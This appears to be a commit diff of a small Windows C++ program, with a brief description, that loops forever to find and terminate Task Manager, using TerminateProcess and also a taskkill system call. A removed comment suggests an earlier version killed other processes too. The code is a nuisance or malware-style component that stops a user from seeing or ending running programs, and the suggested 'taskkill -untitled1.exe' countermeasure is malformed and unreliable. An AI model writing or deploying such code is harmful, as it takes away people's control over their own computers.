Add files via upload
This file, however, targets only the Task Manager and kills it. It can still be defeated by using the cmd command:
taskkill -untitled1.exe    ;assuming that the file is compiled to have the same executable file name

+++ Untitled1.cpp
@@ -1,7 +1,17 @@
+#include"stdio.h"
 #include"windows.h"
 #include"psapi.h"
-#include"stdio.h"
-int main()
+
+void func1()
+{
+	while(1)
+	{
+		Sleep(1000);
+		system("taskkill /IM taskmgr.exe /F");
+	}
+}
+
+void func2()
 {
 	while(1)
 	{
@@ -24,10 +34,15 @@ int main()
             		GetModuleBaseName( hProcess, hMod, processname,30);
         			}
 				}
-    			//if(strcmp((char*)&processname,"Untitled1.exe"))
+    			if(!strcmp((char*)&processname,"taskmgr.exe"))
     			{
     				TerminateProcess(hProcess,0);
     			}
 			}
 	}
+}
+
+int main()
+{
+	func2();
 }
